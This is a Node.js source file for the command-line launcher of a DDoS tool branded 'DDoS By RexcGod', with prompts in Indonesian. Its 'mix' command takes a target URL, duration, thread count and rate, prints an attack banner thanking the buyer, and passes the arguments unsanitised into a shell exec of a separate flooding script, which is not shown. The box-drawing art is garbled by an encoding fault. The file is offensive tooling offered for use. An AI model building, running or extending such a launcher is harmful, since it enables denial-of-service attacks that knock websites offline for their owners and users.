const readline = require('readline');
const { exec } = require('child_process');

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

function displayPrompt() {
  process.stdout.write('\x1b[20mroot@rexcgod~# \x1b[1m');
}

function executeCommand(command, url, time, thread, rate) {
  if (command === 'mix') {
    console.log(`
\x1b[95m             â•”â•â•—â•”â•¦â•—â•”â•¦â•—â•”â•â•—â•”â•â•—â•¦â•”â•  â•”â•â•—â•”â•â•—â•”â•—â•”â•”â•¦ â•—\x1b[0m
\x1b[93m       â•šâ•—    â• â•â•£ â•‘  â•‘ â• â•â•£â•‘  â• â•©â•—  â•šâ•â•—â•‘â•£ â•‘â•‘â•‘ â•‘    â•”â•\x1b[0m
\x1b[92m        â€–    â•© â•© â•©  â•© â•© â•©â•šâ•â•â•© â•©  â•šâ•â•â•šâ•â•â•â•šâ• â•©    â€–\x1b[0m
\x1b[95m        â€–            DDoS By RexcGod            â€–\x1b[0m
\x1b[91m        â•šâ•â•â•â•â•â•¦â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•¦â•â•â•â•â•â•\x1b[0m
\x1b[93mâ•—             â•‘     Attak Registereds     â•‘             â•”\x1b[0m
\x1b[92mâ• â•â•â•â•â•â•â•â•â•â•â•â•â•â•©â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•©â•â•â•â•â•â•â•â•â•â•â•â•â•â•£\x1b[0m
\x1b[95mâ•šâ•—    TARGET       : [ ${url} ]               \x1b[0m
\x1b[93m â€–    TIME         : [ ${time} ]               \x1b[0m
\x1b[92mâ•”â•    PORT         : [ 443 ]                  \x1b[0m
\x1b[91mâ• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£\x1b[0m
\x1b[95mâ€–            Thanks For Buying And Use This.            â€–\x1b[0m
\x1b[92mâ•š                                                       â•\x1b[0m`);
    const filePath = __dirname + '/mix.js';
    exec(`node ${filePath} ${url} ${time} ${thread} ${rate}`, (error, stdout, stderr) => {
      if (error) {
        console.error(`Error: ${error.message}`);
        return;
      }
      if (stderr) {
        console.error(`stderr: ${stderr}`);
        return;
      }
      console.log(stdout);

      // Tampilkan ASCII art "ATTACK SENT" setelah mix.js selesai dieksekusi

      displayPrompt();
    });
  } else {
    console.log(`Perintah ${command} belum diimplementasikan.`);
    displayPrompt();
  }
}

function displayHelp() {
  console.log('\x1b[35m');
  displayPrompt();
}

// ASCII art REXCGOD
console.log(`
  \x1b[35m
â €â €â €â €â €â €â €â €â €â¡€â €â €â €â €â €â €â €â €â €â¢ â¡‡â €â €â €â €â €â €â €â €â¢ â €â €â €â €â €â €â €â €â €â €â €â €â¢€â €â €â €â €â €
â €â €â €â €â €â €â €â €â €â ±â£„â €â£€â£€â¡¤â£´â ¶â ¾â ¿â¢¿â£¿â¡›â ›â ›â¢»â ·â ¶â ¤â¢¤â£¾â£€â €â €â €â¢€â „â €â €â €â €â €â¢€â¡¾â €â €â €â €â €
â¢€â €â €â €â €â €â €â €â¢€â¡¤â¢¿â£¿â¡‰â¡€â €â£ˆâ£¶â£„â£€â£¸â£¿â£„â£€â €â¡¸â €â €â¢€â£¼â €â ‰â ›â ³â¢¶â£¬â£„â¡€â €â €â£ â£¾â¡Ÿâ €â €â €â €â €â €
â €â »â¢¦â£€â €â €â£ â¡¾â£»â£¾â£·â£¾â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£·â£¿â£·â£¶â£¤â£–â£¤â£â£»â£¿â£¿â£¿â£¿â£¿â£‰â €â €â €â €â €â¢€â¡„
â €â €â €â¢™â£¿â£¿â£¿â£¿â£¿â£¿â£¿â ¿â¢Ÿâ£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â¡¿â¢¿â£»â£¿â£·â£¦â£¤â ¶â ‹â €
â €â €â£ â£¿â£¿â£¿â ¿â ›â ‰â â €â¢°â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â ¿â ›â ¿â£¿â£¿â£¿â£¿â¡¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£·â£¿â¡¿â¢Ÿâ¢›â¡»â €â €â €
â €â ˆâ¢€â£žâ¡›â â €â €â €â €â¢´â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£‡â €â €â €â¢¸â£¿â£¿â£¿â£‡â ˜â¢€â ›â¢Ÿâ¡»â¢¿â£¿â£¿â£¿â£¿â£¿â£¶â£¦â£¤â£¤â ¤
â €â ´â ‹â €â €â €â €â €â €â¢€â£¾â£Ÿâ£¿â£¿â£¿â¡¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¤â£€â£ â£´â£¿â£¿â£¿â£¿â¡Žâ â ˆâ €â ‘â ‹â ›â¢¿â£¿â£¿â¡¿â ‰â ‰â â €â €
â €â €â €â €â €â €â €â €â €â¢¸â¡¯â£¾â£Ÿâ¢¿â£¿â£¿â£¿â£¿â£¿â£¿â ›â¢â €â£¿â£¿â£¿â¡Ÿâ¡¿â¡¿â¡¿â£¿â£¿â¡‡â €â ›â ³â£¥â €â €â ™â£¿â¡¿â €â €â €â €â €â €
â €â €â €â €â €â €â €â €â €â¢¸â£§â €â ˆâ ™â ›â „â ˜â£©â£â£ƒâ£¿â£¿â£¿â£§â£â¡›â ƒâ â €â €â¢â¢»â£¿â €â €â €â €â €â¢¤â¢ â¡¿â â €â €â €â €â €â €
â €â €â €â €â €â €â €â €â €â ˆâ£·â €â €â €â €â â ˆâ£¦â¢¹â£¿â£¿â£¿â£¿â¡â¢´â£¿â ‡â €â €â â €â£¹â¡â €â €â €â €â €â €â ¸â â €â €â €â €â €â €â €
â €â €â €â €â €â €â €â €â €â €â¢¹â¡‡â €â €â €â €â €â â¢¾â ¿â£›â£›â£›â¡»â¢·â ˆâ €â €â €â €â €â£¿â ƒâ €â €â €â €â €â €â €â €â €â €â €â €â €â €â €
â €â €â €â €â €â €â €â €â €â €â â¢³â¡€â €â €â €â €â €â €â ‰â ›â Ÿâ ›â ‹â €â €â €â €â €â €â¢€â¡Ÿâ €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €
â €â €â €â €â €â €â£€â£¬â£¿â£¶â£¤â£ˆâ¢³â¡„â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â¢ â£¾â â €â¢€â£€â£¤â£´â£€â €â €â €â €â €â €â €â €â €â €
â €â €â €â €â €â£°â Ÿâ ‰â €â €â¢ˆâ Ÿâ »â ¿â£¶â£¤â£€â£€â €â €â €â €â €â €â €â €â €â£€â£²â£¿â£µâ ¶â ¿â¢â ‰â â ˆâ ™â ·â£†â €â €â €â €â €â €â €â €
â €â €â €â €â €â €â €â €â €â €â â €â €â €â£´â£Ÿâ¡‰â ™â¡¿â ›â »â ¿â£¿â ¿â ¿â¢¿â ›â ‹â ‰â »â£†â €â €â €â ‘â „â €â €â €â ˜â ‚â €â €â €â €â €â €â €
â €â €â €â €â €â €â €â €â €â €â €â €â €â €â ‹â €â ˆâ¢¹â ‹â ’â ²â ´â£·â ¤â €â ˆâ£‡â €â €â €â ˆâ ‡â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €
â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â ‹â €
          ð™¿ðš•ðšŽðšŠðšœðšŽ ðšðš¢ðš™ðšŽ "ð™·ðšŽðš•ðš™" ðšðš˜ ðšœðšðšŠðš›ðšâ €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €
`);

displayPrompt();

let url = '';
let time = '';
let thread = '';
let rate = '';

rl.on('line', (input) => {
  const args = input.split(' ');
  const command = args[0];

  if (command === 'help') {
    console.log('\x1b[93mMIX')
    displayHelp();
  } else if (command === 'mix') {
    if (args.length !== 5) {
      console.log('Format command mix salah. Gunakan format: mix <url> <time> <thread> <rate>');
      displayPrompt();
    } else {
      executeCommand(args[0], args[1], args[2], args[3], args[4]);
    }
  } else {
    console.log(`Perintah ${command} belum diimplementasikan.`);
    displayPrompt();
  }
});
